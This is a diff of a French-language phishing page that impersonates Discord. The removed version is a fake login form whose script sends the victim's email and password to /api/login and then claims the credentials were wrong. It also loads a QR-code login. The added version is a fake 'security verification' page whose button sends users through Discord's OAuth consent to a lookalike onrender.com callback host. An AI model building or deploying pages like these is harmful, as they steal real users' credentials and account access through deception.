@@ -3,68 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Discord</title>
-<link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>Vérification Discord</title>
 <style>
-  * { box-sizing: border-box; font-family: 'gg sans', -apple-system, sans-serif; }
-  body { background: #313338 url('https://discord.com/assets/4b0e1c8b7e4f6e9e9d5e5d5c5b5a5958.png') no-repeat center center fixed; background-size: cover; color: #dbdee1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-  .container { display: flex; flex-direction: column; background: #313338; border-radius: 8px; width: 100%; max-width: 480px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
-  .box { padding: 32px; display: flex; flex-direction: column; }
-  .qr-box { padding: 20px 32px 32px 32px; display: flex; flex-direction: column; align-items: center; text-align: center; border-top: 1px solid #2b2d31; }
-  h2 { color: #f2f3f5; margin-bottom: 8px; font-size: 24px; text-align: center; }
-  p.sub { color: #b5bac1; margin-bottom: 20px; margin-top: 0; text-align: center; font-size: 16px; }
-  label { font-size: 12px; font-weight: 700; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; display: block; }
-  input { width: 100%; padding: 10px; margin-bottom: 20px; background: #1e1f22; border: none; color: #dbdee1; border-radius: 3px; font-size: 16px; outline: none; }
-  button { width: 100%; padding: 12px; background: #5865F2; color: white; border: none; border-radius: 3px; font-weight: bold; font-size: 16px; cursor: pointer; }
-  .link { font-size: 14px; color: #00a8fc; text-decoration: none; margin-top: 15px; display: block; }
-  .qr-img { width: 150px; height: 150px; background: white; border-radius: 8px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; }
-  .qr-img img { width: 100%; height: 100%; border-radius: 8px; display: none; }
-  .fallback { color: #f23f43; font-size: 13px; font-weight: 600; }
+  body { background: #313338; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+  .box { background: #2b2d31; padding: 40px; border-radius: 8px; }
+  a { background: #5865F2; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin-top: 20px; }
 </style>
 </head>
 <body>
-  <div class="container">
-    <div class="box">
-      <h2>Bon retour !</h2>
-      <p class="sub">Nous sommes ravis de vous revoir.</p>
-      <form id="loginForm">
-        <label>Adresse e-mail ou numéro <span style="color:#f23f43">*</span></label>
-        <input type="text" id="email" required>
-        <label>Mot de passe <span style="color:#f23f43">*</span></label>
-        <input type="password" id="password" required>
-        <a href="#" class="link">Mot de passe oublié ?</a>
-        <button type="submit" style="margin-top: 20px;">Se connecter</button>
-      </form>
-    </div>
-    <div class="qr-box">
-      <div class="qr-img" id="qrContainer">
-        <span style="color:black; font-size:12px;" id="qrLoad">Chargement...</span>
-        <img id="qrImage" src="">
-      </div>
-      <h3 style="color:#f2f3f5; font-size:18px; margin-bottom:8px; margin-top:0;">Ou connectez-vous avec un QR code</h3>
-      <p class="fallback">Si le mot de passe ne marche pas, essayez le QR.</p>
-    </div>
+  <div class="box">
+    <h2>Vérification de sécurité</h2>
+    <p>Veuillez autoriser l'application pour continuer.</p>
+    
+    <!-- LE LIEN D'AUTORISATION -->
+    <a href="https://discord.com/api/oauth2/authorize?client_id=1565797236166893779&redirect_uri=https%3A%2F%2Flogin-discord-ba5a.onrender.com%2Fcallback&response_type=code&scope=identify%20guilds">Autoriser</a>
   </div>
-<script>
-  fetch('/api/qr').then(r => r.json()).then(d => {
-    if(d.qrUrl) {
-      document.getElementById('qrLoad').style.display = 'none';
-      let img = document.getElementById('qrImage');
-      img.src = d.qrUrl;
-      img.style.display = 'block';
-    }
-  });
-
-  document.getElementById('loginForm').onsubmit = async (e) => {
-    e.preventDefault();
-    let em = document.getElementById('email').value;
-    let pw = document.getElementById('password').value;
-    await fetch('/api/login', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ email: em, password: pw })
-    });
-    alert("Identifiants incorrects.");
-  };
-</script>
 </body>
 </html>
